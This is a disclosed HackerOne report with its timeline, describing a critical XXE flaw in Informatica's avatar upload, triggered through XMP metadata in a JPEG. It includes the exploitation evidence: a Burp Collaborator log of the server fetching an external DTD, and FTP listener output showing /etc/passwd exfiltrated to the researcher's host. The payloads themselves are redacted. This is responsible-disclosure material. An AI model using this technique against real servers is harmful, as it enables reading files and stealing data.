---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/xml-external-entities-xxe
  - env/web
substate: "resolved"
weakness: "XML External Entities (XXE)"
enriched: true
body: true
date: 2020-04-21
submitted: 2020-04-02T05:09:42.965Z
bounty_usd: null
votes: 138
cve: []
program: "[[programs/informatica|Informatica]]"
reporter: "moebius"
source: "https://hackerone.com/reports/836877"
title: "XXE through injection of a payload in the XMP metadata of a JPEG file"
---
# XXE through injection of a payload in the XMP metadata of a JPEG file

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 138 | **Program:** Informatica | **Disclosed:** 2020-04-21

- Report: [https://hackerone.com/reports/836877](https://hackerone.com/reports/836877)
- CWE: XML External Entities (XXE)
- Submitted: 2020-04-02T05:09:42.965Z

## Report summary

Researcher identified an XXE issue via a JPEG file upload. Researcher worked with us to validate the vulnerability, managed to escalate to return the contents of /etc/passwd and confirmed the issue was then fixed. Informatica responded by initially disabling the feature and then further blocking access to the vulnerable endpoint. Our thanks to moebius for the report, and the detailed writeup associated with it. Some technical details have been redacted in the below. 

Should there be any queries, please contact us via security@informatica.com

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Users are able to change their avatar picture. The avatar picture upload functionality is prone to a XXE attack when parsing the image file. Specifically, the XXE attack is executed through the injection of a payload in the "XMP metadata" of the uploaded JPEG file.

Proof of concept (note the "Burp Collaborator Payload pointing to an External DTD"):
```
POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1
Host: ███████informatica.com

  [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]
```

And I received the following calls (note the User-Agent "Java██████" confirming the vulnerability):

```
Interaction 0 
Type: HTTP 
Client IP: ███████ 
Timestamp: 2020-Apr-02 01:44:27 UTC  
Protocol: HTTP  

RAW HTTP request: 

GET /x.dtd HTTP/1.1 
Cache-Control: no-cache 
Pragma: no-cache 
User-Agent: Java██████ 
Host: N.syuj65rfsb27o1u78jcinsinnet6ky8n.burpcollaborator.net 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive
```

Similar calls were received from another IP address: 146.112.138.73

Furthermore, the affected host should not be allowed to start a new connection to the Internet.

## Impact

This issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. I didn't try any reading, but JAVA (JSPA is a JAVA Servlet File) is calling my external service, so the vulnerability is confirmed.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2020-04-02** @moebius: Hi @aks_infa !
It is interesting, now I'm not getting the callback from the affected server. Are you still investigating the issue? I'm now working on this to get a payload working. Let me know if you fix it or limit new outbound traffic from the server.

Thanks!
- **2020-04-02** @moebius: Ok! Got it working again:

████
- **2020-04-02** @moebius: I was able to reproduce it! Check the video I recorded for you. In order to get this working, as it is inside a JPEG file, you have to deal with the exact bytes, but as you will see, it is responding my requests.

In order to fix this, check the JAVA paragraph here: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

It is not a common bug, it is exploiting the XMP metadata inside an authorized JPEG file.

Hope now you can reproduce this and fix this. Please, let me know!

Thanks!
- **2020-04-02** @moebius: @aks_infa Finally! I was able to retrieve the "/etc/passwd" file from the server.

This is the DTD file I used:

{F771303}

And this is the Payload sent inside the image:

█████

This is the result:

```
XXE-FTP listening 
Connected by %s ('█████████', 32231)
USER anonymous

PASS Java█████

TYPE I

/root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
█████████
ntp:x:38:38::/etc/ntp:/sbin/nologin
██████████
█████████
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
██████
systemd-bus-proxy:x:500:221:systemd Bus Proxy:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
puppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologin
nrpe:x:499:220:NRPE user for the NRPE service:/var/run/nrpe:/sbin/nologin
█████████
██████████

EPSV

EPRT |1|█████████|65407|

RETR nologin
```

That was the only file I got from the server as a PoC.

Let me know!
- **Report Triaged**
- **2020-04-03** @moebius: @aks_infa Perfect, thank you! I will wait then. Let me know if you need any other advise or recommendation on this. Be good and safe.
- **2020-04-03** @kmcgaley: Hi @moebius, Thank you for this report! As a temporary resolution we have disabled the upload feature while the team work on a fix for the root cause of the problem.  If you get some time could you verify if the exploit is still possible on your end? 

Thanks!
- **2020-04-03** @moebius: Hey @kmcgaley ! Yes, I checked and now I can't see the feature in the UI. However, it is still possible to call the vulnerable endpoint if you know the full path (that might be found in the JS files):

███

Try to see if you can disable the endpoint or change its name (security by obscurity but could work while you fix it).

Also, add a rule in your firewalls, to deny new connections coming from the inside. Thats also a way, because even though it is vulnerable, the attacker won't get the Out of Band answer.

Let me know!
- **2020-04-07** @moebius: Hi @kmcgaley ! Hope you are doing well. Any news? Need help? Thank you!
- **2020-04-10** @moebius: Hi @aks_infa and @kmcgaley. Any news? Were you able to reproduce and fix the problem? I can retest if you need it. Thank you!
- **2020-04-13** @moebius: Sorry @kmcgaley and @aks_infa but it's been 10 days since your last contact. Can you please update? Thank you very much!
- **Report Resolved**
- **2020-04-14** @moebius: hey @nheffernan ! no problem. Thank you. Yes, you can use "Moebius", that's fine. I know that this program does not usually offer paid bounties (but sometimes you do), can you consider this time that? Because of the severity, the quality of my report and follow ups, the difficulty of exploitation, and the "hidden" place I found this, etc.? Other programs pay up to 4K for a vulnerability like this one. Let me know! And thank you for considering that.
- **2020-04-14** @nheffernan: Hi @moebius - unfortunately we don't have capability at the moment to award bounties in any cases, but happy to add that name to the hall of fame, we will let you know once it is next updated.
- **Agreed On Going Public**
- **2020-04-20** @moebius: @nheffernan can we disclose? Thank you!
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **Agreed On Going Public**
- **Report Became Public**
- **2020-04-21** @nheffernan: Hi @moebius - Sure, i've redacted some of the sensitive information (or screenshots containing same) and added a quick summary. Thanks again for the report.
- **2020-05-21** @aks_infa: Hi  @moebius 
We have updated our "Hall of Fame" page.
You can check your name on https://www.informatica.com/trust-center/security-researcher-hall-of-fame.html
Thank you again for your effort.
